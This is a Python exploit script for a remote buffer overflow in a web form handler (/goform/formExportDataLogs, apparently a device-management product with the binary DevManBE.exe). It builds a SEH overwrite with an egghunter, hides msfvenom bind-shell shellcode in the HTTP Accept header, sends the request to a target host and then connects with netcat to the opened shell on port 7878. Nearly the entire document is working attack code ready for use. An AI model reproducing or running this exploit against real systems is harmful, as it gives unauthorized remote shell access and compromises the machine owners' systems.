#!/usr/bin/python
import urllib
import os
import sys
import struct
import time
from socket import *

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.94 LPORT=7878  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python


egg="b33fb33f"
buf= egg
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x94\x4f\x35\xbe\x83\xee\xfc\xe2\xf4\x68\xa7"
buf += "\xb7\xbe\x94\x4f\x55\x37\x71\x7e\xf5\xda\x1f\x1f\x05"
buf += "\x35\xc6\x43\xbe\xec\x80\xc4\x47\x96\x9b\xf8\x7f\x98"
buf += "\xa5\xb0\x99\x82\xf5\x33\x37\x92\xb4\x8e\xfa\xb3\x95"
buf += "\x88\xd7\x4c\xc6\x18\xbe\xec\x84\xc4\x7f\x82\x1f\x03"
buf += "\x24\xc6\x77\x07\x34\x6f\xc5\xc4\x6c\x9e\x95\x9c\xbe"
buf += "\xf7\x8c\xac\x0f\xf7\x1f\x7b\xbe\xbf\x42\x7e\xca\x12"
buf += "\x55\x80\x38\xbf\x53\x77\xd5\xcb\x62\x4c\x48\x46\xaf"
buf += "\x32\x11\xcb\x70\x17\xbe\xe6\xb0\x4e\xe6\xd8\x1f\x43"
buf += "\x7e\x35\xcc\x53\x34\x6d\x1f\x4b\xbe\xbf\x44\xc6\x71"
buf += "\x9a\xb0\x14\x6e\xdf\xcd\x15\x64\x41\x74\x10\x6a\xe4"
buf += "\x1f\x5d\xde\x33\xc9\x27\x06\x8c\x94\x4f\x5d\xc9\xe7"
buf += "\x7d\x6a\xea\xfc\x03\x42\x98\x93\xb0\xe0\x06\x04\x4e"
buf += "\x35\xbe\xbd\x8b\x61\xee\xfc\x66\xb5\xd5\x94\xb0\xe0"
buf += "\xd4\x9c\x16\x65\x5c\x69\x0f\x65\xfe\xc4\x27\xdf\xb1"
buf += "\x4b\xaf\xca\x6b\x03\x27\x37\xbe\x8a\x89\xbc\x58\xfe"
buf += "\x5f\x63\xe9\xfc\x8d\xee\x89\xf3\xb0\xe0\xe9\xfc\xf8"
buf += "\xdc\x86\x6b\xb0\xe0\xe9\xfc\x3b\xd9\x85\x75\xb0\xe0"
buf += "\xe9\x03\x27\x40\xd0\xd9\x2e\xca\x6b\xfc\x2c\x58\xda"
buf += "\x94\xc6\xd6\xe9\xc3\x18\x04\x48\xfe\x5d\x6c\xe8\x76"
buf += "\xb2\x53\x79\xd0\x6b\x09\xbf\x95\xc2\x71\x9a\x84\x89"
buf += "\x35\xfa\xc0\x1f\x63\xe8\xc2\x09\x63\xf0\xc2\x19\x66"
buf += "\xe8\xfc\x36\xf9\x81\x12\xb0\xe0\x37\x74\x01\x63\xf8"
buf += "\x6b\x7f\x5d\xb6\x13\x52\x55\x41\x41\xf4\xd5\xa3\xbe"
buf += "\x45\x5d\x18\x01\xf2\xa8\x41\x41\x73\x33\xc2\x9e\xcf"
buf += "\xce\x5e\xe1\x4a\x8e\xf9\x87\x3d\x5a\xd4\x94\x1c\xca"
buf += "\x6b"


#tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'

hunter =  ""
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "\x41" * (721 -len(hunter))
buffer +="\x90"*30 + hunter
buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
 

content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print "[+] Waiting "
s.send(payload)
time.sleep(30)
os.system("nc -nv " + HOST +" 7878")
s.close()



